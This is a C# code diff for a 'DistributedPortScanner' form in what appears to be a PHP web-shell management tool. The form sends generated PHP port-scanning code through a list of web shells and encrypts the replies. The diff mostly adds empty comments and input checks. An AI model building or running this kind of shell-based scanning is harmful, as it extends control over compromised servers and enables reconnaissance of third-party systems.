@@ -7,11 +7,19 @@ namespace bantam.Forms
 {
     public partial class DistributedPortScanner : Form
     {
+        /// <summary>
+        /// 
+        /// </summary>
         public DistributedPortScanner()
         {
             InitializeComponent();
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void DistributedScanner_Load(object sender, EventArgs e)
         {
             foreach(var shell in BantamMain.Shells) {
@@ -19,11 +27,23 @@ namespace bantam.Forms
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private async void btnScan_Click(object sender, EventArgs e)
         {
+            //todo uri / ip check?
             if (string.IsNullOrEmpty(textBoxTarget.Text)) {
                 return;
                 //todo ui thing
+            }
+
+            if (string.IsNullOrEmpty(textBoxStartPort.Text)
+             || string.IsNullOrEmpty(textBoxEndPort.Text)) {
+                //todo ui thing
+                return;
             }
 
             //todo port validation?
@@ -69,17 +89,11 @@ namespace bantam.Forms
 
                 bool encryptResponse = true;
                 string shellUrl = checkedListBoxShells.GetItemText(checkedItem);
-                //todo uri validation
-                var uri = new Uri(shellUrl);
-                var host = uri.Host;
 
-                string responseText = "[" + host + "] - returned ports (" + scannedRange + ") - \r\n";
-
+                string responseText = "[" + shellUrl + "] - returned ports (" + scannedRange + ") - \r\n";
                 string phpCode = PhpHelper.PortScanner(textBoxTarget.Text, portsCode, encryptResponse);
 
                 BantamMain.executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, rtb, responseText);
-
-                //TODO if done and no response from one of the servers display that it did not respond for the
 
                 btnScan.Enabled = true;
             }
